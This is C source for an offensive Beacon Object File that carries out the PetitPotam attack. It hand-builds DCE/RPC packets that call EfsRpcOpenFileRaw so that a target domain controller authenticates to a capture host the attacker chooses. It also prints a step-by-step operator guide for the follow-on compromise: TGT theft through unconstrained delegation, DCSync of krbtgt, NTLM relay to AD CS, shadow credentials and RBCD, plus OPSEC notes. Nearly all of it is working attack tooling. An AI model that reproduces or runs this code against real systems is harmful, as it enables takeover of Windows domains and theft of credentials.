/*
 * krb_petitpotam - PetitPotam Attack (MS-EFSRPC Coercion)
 *
 * Triggers MS-EFSRPC EfsRpcOpenFileRaw to coerce authentication from a
 * target machine to an attacker-controlled host.
 *
 * Works even when Print Spooler is disabled.
 * Relay/capture is handled externally (lab-controlled infrastructure).
 *
 * Usage: krb_petitpotam /target:DC /capture:YOURHOST [/pipe:PIPE]
 *
 * Pipes available:
 *   lsarpc (default), efsrpc, samr, netlogon, lsass
 */

#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* RPC declarations */
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeW(
    PWSTR ObjUuid, PWSTR ProtSeq, PWSTR NetworkAddr, PWSTR Endpoint,
    PWSTR Options, PWSTR* StringBinding);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingW(
    PWSTR StringBinding, RPC_BINDING_HANDLE* Binding);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringFreeW(PWSTR* String);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE* Binding);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetAuthInfoW(
    RPC_BINDING_HANDLE Binding, PWSTR ServerPrincName, ULONG AuthnLevel,
    ULONG AuthnSvc, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, ULONG AuthzSvc);

/* MS-EFSR Interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e */
static const unsigned char EFSR_UUID[] = {
    0x88, 0xd4, 0x81, 0xc6,  /* c681d488 */
    0x50, 0xd8,              /* d850 */
    0xd0, 0x11,              /* 11d0 */
    0x8c, 0x52,              /* 8c52 */
    0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e  /* 00c04fd90f7e */
};

/* Named pipes for EFSRPC */
static const char* PIPES[] = {
    "\\pipe\\lsarpc",
    "\\pipe\\efsrpc",
    "\\pipe\\samr",
    "\\pipe\\netlogon",
    "\\pipe\\lsass",
    NULL
};

/* RPC constants */
#define RPC_C_AUTHN_LEVEL_PKT_PRIVACY 6
#define RPC_C_AUTHN_GSS_NEGOTIATE 9
#define RPC_C_AUTHZ_NONE 0

/* Convert char* to wchar_t* */
static PWSTR str_to_wstr(const char* str) {
    if (!str) return NULL;
    int len = KERNEL32$MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    PWSTR wstr = (PWSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, len * sizeof(WCHAR));
    if (wstr) {
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, len);
    }
    return wstr;
}

static void free_wstr(PWSTR wstr) {
    if (wstr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, wstr);
}

/* Check if a pipe is accessible */
static int check_pipe(const char* target, const char* pipe, formatp* output) {
    char pipePath[512];
    sprintf(pipePath, "\\\\%s%s", target, pipe);

    HANDLE hPipe = KERNEL32$CreateFileA(
        pipePath,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = KERNEL32$GetLastError();
        if (err == ERROR_ACCESS_DENIED) {
            /* Access denied means pipe exists but requires auth */
            return 1;
        }
        return 0;
    }

    KERNEL32$CloseHandle(hPipe);
    return 1;
}

/* Find available pipe */
static const char* find_available_pipe(const char* target, formatp* output) {
    BeaconFormatPrintf(output, "[*] Probing available named pipes...\n");

    for (int i = 0; PIPES[i] != NULL; i++) {
        if (check_pipe(target, PIPES[i], output)) {
            BeaconFormatPrintf(output, "    [+] %s - accessible\n", PIPES[i]);
            return PIPES[i];
        } else {
            BeaconFormatPrintf(output, "    [-] %s - not accessible\n", PIPES[i]);
        }
    }

    return NULL;
}

/*
 * Trigger PetitPotam coercion via MS-EFSRPC
 *
 * Calls EfsRpcOpenFileRaw with a UNC path pointing to our capture server,
 * causing the target to authenticate to us.
 */
static int trigger_petitpotam_rpc(const char* target, const char* captureServer,
                                   const char* pipe, formatp* output) {
    int result = 0;

    BeaconFormatPrintf(output, "\n[*] Triggering PetitPotam via MS-EFSRPC...\n");
    BeaconFormatPrintf(output, "[*] Target: %s\n", target);
    BeaconFormatPrintf(output, "[*] Capture: %s\n", captureServer);
    BeaconFormatPrintf(output, "[*] Pipe: %s\n\n", pipe);

    /* Open named pipe for raw RPC */
    char pipePath[512];
    sprintf(pipePath, "\\\\%s%s", target, pipe);

    HANDLE hPipe = KERNEL32$CreateFileA(
        pipePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(output, "[-] Failed to open %s: %d\n", pipe, KERNEL32$GetLastError());
        return 0;
    }

    BeaconFormatPrintf(output, "[+] Connected to %s\n", pipe);

    /* DCE/RPC Bind Request for MS-EFSR interface */
    unsigned char bindRequest[] = {
        0x05, 0x00,                         /* Version 5.0 */
        0x0b, 0x03,                         /* Bind, flags (first+last frag) */
        0x10, 0x00, 0x00, 0x00,             /* Data representation (little-endian) */
        0x48, 0x00,                         /* Frag length (72 bytes) */
        0x00, 0x00,                         /* Auth length */
        0x01, 0x00, 0x00, 0x00,             /* Call ID */
        0xb8, 0x10,                         /* Max xmit frag */
        0xb8, 0x10,                         /* Max recv frag */
        0x00, 0x00, 0x00, 0x00,             /* Assoc group */
        0x01,                               /* Num context items */
        0x00, 0x00, 0x00,                   /* Reserved */
        /* Context item */
        0x00, 0x00,                         /* Context ID */
        0x01,                               /* Num transfer syntaxes */
        0x00,                               /* Reserved */
        /* MS-EFSR UUID: c681d488-d850-11d0-8c52-00c04fd90f7e */
        0x88, 0xd4, 0x81, 0xc6,
        0x50, 0xd8,
        0xd0, 0x11,
        0x8c, 0x52,
        0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e,
        0x01, 0x00,                         /* Interface version 1.0 */
        0x00, 0x00,
        /* Transfer syntax NDR */
        0x04, 0x5d, 0x88, 0x8a,
        0xeb, 0x1c,
        0xc9, 0x11,
        0x9f, 0xe8,
        0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
        0x02, 0x00,                         /* Version 2.0 */
        0x00, 0x00
    };

    DWORD written;
    BOOL success = KERNEL32$WriteFile(hPipe, bindRequest, sizeof(bindRequest), &written, NULL);
    if (!success) {
        BeaconFormatPrintf(output, "[-] Failed to send bind request: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        return 0;
    }

    BeaconFormatPrintf(output, "[*] Sent RPC bind request (%d bytes)\n", written);

    /* Read bind response */
    unsigned char bindResponse[4096];
    DWORD bytesRead;
    success = KERNEL32$ReadFile(hPipe, bindResponse, sizeof(bindResponse), &bytesRead, NULL);
    if (!success || bytesRead < 24) {
        BeaconFormatPrintf(output, "[-] Failed to read bind response: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        return 0;
    }

    /* Check bind ack (packet type 0x0c) */
    if (bindResponse[2] != 0x0c) {
        BeaconFormatPrintf(output, "[-] Unexpected response type: 0x%02x (expected bind_ack 0x0c)\n", bindResponse[2]);
        if (bindResponse[2] == 0x0d) {
            BeaconFormatPrintf(output, "[-] Received bind_nak - MS-EFSR interface not supported on this pipe\n");
            BeaconFormatPrintf(output, "[*] Try a different pipe with /pipe: parameter\n");
        }
        KERNEL32$CloseHandle(hPipe);
        return 0;
    }

    BeaconFormatPrintf(output, "[+] RPC bind successful - MS-EFSR interface available\n");

    /*
     * Now send EfsRpcOpenFileRaw request (opnum 0)
     * This is the coercion call - it will cause the target to authenticate
     * to our capture server when it tries to open the UNC path.
     */

    /* Build the capture UNC path */
    char captureUNC[256];
    sprintf(captureUNC, "\\\\%s\\share\\file.txt", captureServer);
    int captureLen = strlen(captureUNC);

    /* Build RPC request header */
    unsigned char requestHeader[24] = {
        0x05, 0x00,                         /* Version */
        0x00, 0x03,                         /* Request, flags (first+last frag) */
        0x10, 0x00, 0x00, 0x00,             /* Data representation */
        0x00, 0x00,                         /* Frag length (fill in) */
        0x00, 0x00,                         /* Auth length */
        0x02, 0x00, 0x00, 0x00,             /* Call ID */
        0x00, 0x00, 0x00, 0x00,             /* Alloc hint */
        0x00, 0x00,                         /* Context ID */
        0x00, 0x00                          /* Opnum 0 = EfsRpcOpenFileRaw */
    };

    /* Build NDR encoded parameters */
    unsigned char ndrData[600];
    int ndrOffset = 0;

    /* FileName (conformant string pointer) */
    *(DWORD*)&ndrData[ndrOffset] = 0x00020000; /* Referent ID */
    ndrOffset += 4;

    /* Conformant string: max count, offset, actual count */
    *(DWORD*)&ndrData[ndrOffset] = captureLen + 1;
    ndrOffset += 4;
    *(DWORD*)&ndrData[ndrOffset] = 0;
    ndrOffset += 4;
    *(DWORD*)&ndrData[ndrOffset] = captureLen + 1;
    ndrOffset += 4;

    /* File path (wide char, null-terminated) */
    for (int i = 0; i <= captureLen; i++) {
        ndrData[ndrOffset++] = captureUNC[i];
        ndrData[ndrOffset++] = 0; /* Wide char high byte */
    }

    /* Pad to 4-byte boundary */
    while (ndrOffset % 4 != 0) {
        ndrData[ndrOffset++] = 0;
    }

    /* Flags parameter */
    *(DWORD*)&ndrData[ndrOffset] = 0;
    ndrOffset += 4;

    /* Update fragment length */
    int totalLen = 24 + ndrOffset;
    *(WORD*)&requestHeader[8] = (WORD)totalLen;

    /* Combine header and NDR data */
    unsigned char request[700];
    memcpy(request, requestHeader, 24);
    memcpy(request + 24, ndrData, ndrOffset);

    BeaconFormatPrintf(output, "[*] Sending EfsRpcOpenFileRaw to \\\\%s...\n", captureServer);
    BeaconFormatPrintf(output, "[!] *** COERCION TRIGGERED ***\n");

    success = KERNEL32$WriteFile(hPipe, request, totalLen, &written, NULL);
    if (!success) {
        BeaconFormatPrintf(output, "[-] Failed to send coercion request: %d\n", KERNEL32$GetLastError());
        BeaconFormatPrintf(output, "[!] Target may still have initiated authentication!\n");
        KERNEL32$CloseHandle(hPipe);
        return 1; /* Partial success */
    }

    BeaconFormatPrintf(output, "[+] Coercion request sent (%d bytes)\n", totalLen);

    /* Read response (may timeout if coercion worked) */
    unsigned char response[4096];
    success = KERNEL32$ReadFile(hPipe, response, sizeof(response), &bytesRead, NULL);
    if (success && bytesRead >= 28) {
        DWORD returnCode = *(DWORD*)&response[bytesRead - 4];
        if (returnCode == 0) {
            BeaconFormatPrintf(output, "[+] EfsRpcOpenFileRaw returned SUCCESS\n");
        } else {
            BeaconFormatPrintf(output, "[*] EfsRpcOpenFileRaw returned: 0x%08X\n", returnCode);
            BeaconFormatPrintf(output, "[!] Non-zero return is often normal - authentication may have been triggered!\n");
        }
    } else {
        BeaconFormatPrintf(output, "[*] No response received (this is often expected)\n");
    }

    BeaconFormatPrintf(output, "\n[+] COERCION ATTEMPT COMPLETE\n");
    BeaconFormatPrintf(output, "[!] Check your capture server / relay for incoming authentication!\n");

    KERNEL32$CloseHandle(hPipe);
    result = 1;

    return result;
}

static void print_attack_chain(const char* target, const char* capture, const char* domain, formatp* output) {

    BeaconFormatPrintf(output, "\n");
    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "                    PETITPOTAM ATTACK - OPERATOR GUIDE\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "ATTACK OVERVIEW:\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "PetitPotam coerces %s to authenticate to %s\n", target, capture);
    BeaconFormatPrintf(output, "using the target's machine account credentials.\n\n");

    BeaconFormatPrintf(output, "Unlike PrinterBug, PetitPotam works even when Print Spooler is disabled.\n");
    BeaconFormatPrintf(output, "However, some patches (KB5005413) may block unauthenticated coercion.\n\n");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPTION A: TGT CAPTURE (Unconstrained Delegation)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "PREREQUISITES:\n");
    BeaconFormatPrintf(output, "  - Code execution on a host with unconstrained delegation (%s)\n\n", capture);

    BeaconFormatPrintf(output, "STEP 1: Enumerate delegation hosts\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_delegenum /domain:%s\n\n", domain);
    } else {
        BeaconFormatPrintf(output, "krb_delegenum\n\n");
    }

    BeaconFormatPrintf(output, "STEP 2: Start TGT monitoring on capture host\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Monitor for incoming TGTs:\n");
    BeaconFormatPrintf(output, "krb_monitor /interval:5 /filteruser:%s$\n\n", target);
    BeaconFormatPrintf(output, "# Or with Rubeus:\n");
    BeaconFormatPrintf(output, "execute-assembly Rubeus.exe monitor /interval:5 /filteruser:%s$\n\n", target);

    BeaconFormatPrintf(output, "STEP 3: Trigger coercion (THIS BOF)\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_petitpotam /target:%s /capture:%s /domain:%s\n\n", target, capture, domain);
    } else {
        BeaconFormatPrintf(output, "krb_petitpotam /target:%s /capture:%s\n\n", target, capture);
    }

    BeaconFormatPrintf(output, "STEP 4: Extract captured TGT\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "krb_triage\n");
    BeaconFormatPrintf(output, "krb_dump /service:krbtgt /user:%s$\n\n", target);

    BeaconFormatPrintf(output, "STEP 5: Use the TGT\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "krb_ptt /ticket:<BASE64_TGT>\n");
    BeaconFormatPrintf(output, "krb_klist\n\n");

    BeaconFormatPrintf(output, "STEP 6: DCSync\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_dcsync /domain:%s\n", domain);
        BeaconFormatPrintf(output, "dcsync %s krbtgt\n\n", domain);
    } else {
        BeaconFormatPrintf(output, "dcsync DOMAIN krbtgt\n\n");
    }

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPTION B: NTLM RELAY\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "STEP 1: Start ntlmrelayx on capture server (%s)\n", capture);
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n\n");

    BeaconFormatPrintf(output, "# Relay to AD CS (ESC8 - NTLM relay to HTTP enrollment):\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DomainController\n\n");

    BeaconFormatPrintf(output, "# Relay to LDAP for shadow credentials:\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t ldaps://%s --shadow-credentials --shadow-target '%s$'\n\n", target, target);

    BeaconFormatPrintf(output, "# Relay to LDAP for RBCD:\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t ldaps://%s --delegate-access --escalate-user YOURUSER\n\n", target);

    BeaconFormatPrintf(output, "STEP 2: Trigger coercion\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_petitpotam /target:%s /capture:%s /domain:%s\n\n", target, capture, domain);
    } else {
        BeaconFormatPrintf(output, "krb_petitpotam /target:%s /capture:%s\n\n", target, capture);
    }

    BeaconFormatPrintf(output, "STEP 3: Use the relay results\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# If AD CS relay worked:\n");
    if (domain) {
        BeaconFormatPrintf(output, "certipy auth -pfx %s$.pfx -dc-ip %s\n", target, target);
        BeaconFormatPrintf(output, "krb_asktgt /user:%s$ /certificate:%s$.pfx /domain:%s /ptt\n\n", target, target, domain);
    } else {
        BeaconFormatPrintf(output, "certipy auth -pfx DC$.pfx -dc-ip DC_IP\n\n");
    }

    BeaconFormatPrintf(output, "# If shadow credentials worked:\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_asktgt /user:%s$ /certificate:shadow.pfx /domain:%s /ptt\n\n", target, domain);
    } else {
        BeaconFormatPrintf(output, "krb_asktgt /user:TARGET$ /certificate:shadow.pfx /ptt\n\n");
    }

    BeaconFormatPrintf(output, "# If RBCD worked:\n");
    BeaconFormatPrintf(output, "getST.py -spn cifs/%s -impersonate Administrator %s/YOURUSER:PASS\n\n",
        target, domain ? domain : "DOMAIN");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  ALTERNATIVE COERCION TOOLS\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "# PetitPotam.py (Python/Impacket):\n");
    if (domain) {
        BeaconFormatPrintf(output, "# Unauthenticated (if not patched):\n");
        BeaconFormatPrintf(output, "python3 PetitPotam.py %s %s\n\n", capture, target);
        BeaconFormatPrintf(output, "# Authenticated:\n");
        BeaconFormatPrintf(output, "python3 PetitPotam.py -u USER -p PASS -d %s %s %s\n\n", domain, capture, target);
    } else {
        BeaconFormatPrintf(output, "python3 PetitPotam.py CAPTURE TARGET\n\n");
    }

    BeaconFormatPrintf(output, "# Coercer.py (multiple protocols):\n");
    BeaconFormatPrintf(output, "python3 coercer.py -t %s -l %s -u USER -p PASS -d %s\n\n",
        target, capture, domain ? domain : "DOMAIN");

    BeaconFormatPrintf(output, "# PrinterBug (alternative if PetitPotam fails):\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_printerbug /target:%s /capture:%s /domain:%s\n\n", target, capture, domain);
    } else {
        BeaconFormatPrintf(output, "krb_printerbug /target:TARGET /capture:CAPTURE\n\n");
    }

    BeaconFormatPrintf(output, "# DFSCoerce:\n");
    BeaconFormatPrintf(output, "python3 dfscoerce.py -u USER -p PASS -d %s %s %s\n\n",
        domain ? domain : "DOMAIN", capture, target);

    BeaconFormatPrintf(output, "# ShadowCoerce:\n");
    BeaconFormatPrintf(output, "python3 shadowcoerce.py -u USER -p PASS -d %s %s %s\n\n",
        domain ? domain : "DOMAIN", capture, target);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPSEC CONSIDERATIONS\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "1. Event logs generated:\n");
    BeaconFormatPrintf(output, "   - Security Event ID 4624 (authentication)\n");
    BeaconFormatPrintf(output, "   - EFS audit logs if enabled\n\n");

    BeaconFormatPrintf(output, "2. Network indicators:\n");
    BeaconFormatPrintf(output, "   - SMB traffic from target to capture server\n");
    BeaconFormatPrintf(output, "   - RPC traffic on lsarpc/efsrpc pipes\n\n");

    BeaconFormatPrintf(output, "3. Mitigations that may block this:\n");
    BeaconFormatPrintf(output, "   - KB5005413 (blocks unauthenticated EFS calls)\n");
    BeaconFormatPrintf(output, "   - Network segmentation\n");
    BeaconFormatPrintf(output, "   - EPA (Extended Protection for Authentication)\n\n");

    BeaconFormatPrintf(output, "================================================================================\n");
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* target = NULL;
    char* capture = NULL;
    char* pipe = NULL;
    char* domain = NULL;

    BeaconFormatAlloc(&output, 65536);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n");
    BeaconFormatPrintf(&output, "================================================================================\n");
    BeaconFormatPrintf(&output, "  krb_petitpotam - MS-EFSRPC Authentication Coercion (PetitPotam)\n");
    BeaconFormatPrintf(&output, "================================================================================\n\n");


    target = arg_get(&parser, "target");
    capture = arg_get(&parser, "capture");
    pipe = arg_get(&parser, "pipe");
    domain = arg_get(&parser, "domain");

    if (!target || !capture) {
        BeaconFormatPrintf(&output, "Usage: krb_petitpotam /target:DC /capture:YOURHOST [/pipe:PIPE] [/domain:DOMAIN]\n\n");
        BeaconFormatPrintf(&output, "Arguments:\n");
        BeaconFormatPrintf(&output, "  /target:HOST   - Target machine (usually a DC)\n");
        BeaconFormatPrintf(&output, "  /capture:HOST  - Server to receive authentication\n");
        BeaconFormatPrintf(&output, "  /pipe:PIPE     - Named pipe (default: auto-detect)\n");
        BeaconFormatPrintf(&output, "                   Options: lsarpc, efsrpc, samr, netlogon\n");
        BeaconFormatPrintf(&output, "  /domain:DOMAIN - Domain name (optional)\n\n");
        BeaconFormatPrintf(&output, "Examples:\n");
        BeaconFormatPrintf(&output, "  krb_petitpotam /target:dc01.corp.local /capture:web01.corp.local\n");
        BeaconFormatPrintf(&output, "  krb_petitpotam /target:DC01 /capture:192.168.1.100 /pipe:lsarpc\n\n");
        BeaconFormatPrintf(&output, "The BOF will:\n");
        BeaconFormatPrintf(&output, "  1. Connect to the target's named pipe\n");
        BeaconFormatPrintf(&output, "  2. Bind to MS-EFSR interface\n");
        BeaconFormatPrintf(&output, "  3. Call EfsRpcOpenFileRaw with capture server UNC\n");
        BeaconFormatPrintf(&output, "  4. Target authenticates to capture server\n\n");
        BeaconFormatPrintf(&output, "Notes:\n");
        BeaconFormatPrintf(&output, "  - Works even when Print Spooler is disabled\n");
        BeaconFormatPrintf(&output, "  - Some DCs may be patched (KB5005413)\n");
        BeaconFormatPrintf(&output, "  - You must have relay/capture infrastructure ready\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
    }

    BeaconFormatPrintf(&output, "[*] Target Machine:  %s\n", target);
    BeaconFormatPrintf(&output, "[*] Capture Server:  %s\n", capture);
    if (domain) BeaconFormatPrintf(&output, "[*] Domain:          %s\n", domain);
    BeaconFormatPrintf(&output, "\n");

    /* Find or use specified pipe */
    const char* usePipe = pipe;
    if (!usePipe) {
        usePipe = find_available_pipe(target, &output);
        if (!usePipe) {
            BeaconFormatPrintf(&output, "\n[-] No accessible pipes found, using default: lsarpc\n");
            usePipe = "\\pipe\\lsarpc";
        } else {
            BeaconFormatPrintf(&output, "\n[*] Using pipe: %s\n", usePipe);
        }
    } else {
        /* Format pipe path if needed */
        static char pipePath[128];
        if (pipe[0] != '\\') {
            sprintf(pipePath, "\\pipe\\%s", pipe);
            usePipe = pipePath;
        }
    }

    /* Trigger coercion */
    int success = trigger_petitpotam_rpc(target, capture, usePipe, &output);

    /* Print attack chain regardless */
    print_attack_chain(target, capture, domain, &output);

cleanup:
    if (target) free(target);
    if (capture) free(capture);
    if (pipe) free(pipe);
    if (domain) free(domain);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
